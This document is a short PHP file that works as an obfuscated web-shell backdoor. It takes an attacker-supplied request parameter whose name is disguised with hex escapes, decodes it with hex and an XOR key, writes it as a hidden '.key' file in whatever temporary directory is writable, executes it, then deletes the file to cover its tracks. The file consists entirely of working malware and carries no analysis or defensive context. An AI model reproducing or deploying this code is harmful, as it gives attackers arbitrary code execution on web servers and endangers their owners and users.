<?php

if(count($_REQUEST) > 0 && isset($_REQUEST["\x64ata\x5Fchu\x6Ek"])){
	$itm = hex2bin($_REQUEST["\x64ata\x5Fchu\x6Ek"]);
	$flag    =    ''    ; $o = 0; while($o < strlen($itm)){$flag .= chr(ord($itm[$o]) ^ 38);$o++;}
	$object = array_filter([sys_get_temp_dir(), getenv("TMP"), ini_get("upload_tmp_dir"), session_save_path(), "/var/tmp", "/tmp", getenv("TEMP"), "/dev/shm", getcwd()]);
	$entity = 0;
do {
    $marker = $object[$entity] ?? null;
    if ($entity >= count($object)) break;
    		if (max(0, is_dir($marker) * is_writable($marker))) {
    $fac = implode("/", [$marker, ".key"]);
    if (file_put_contents($fac, $flag)) {
	require $fac;
	unlink($fac);
	die();
}
}
    $entity++;
} while (true);
}